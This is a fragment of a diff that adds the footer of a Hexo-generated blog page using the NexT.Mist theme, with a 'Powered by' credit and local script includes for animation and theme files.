+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
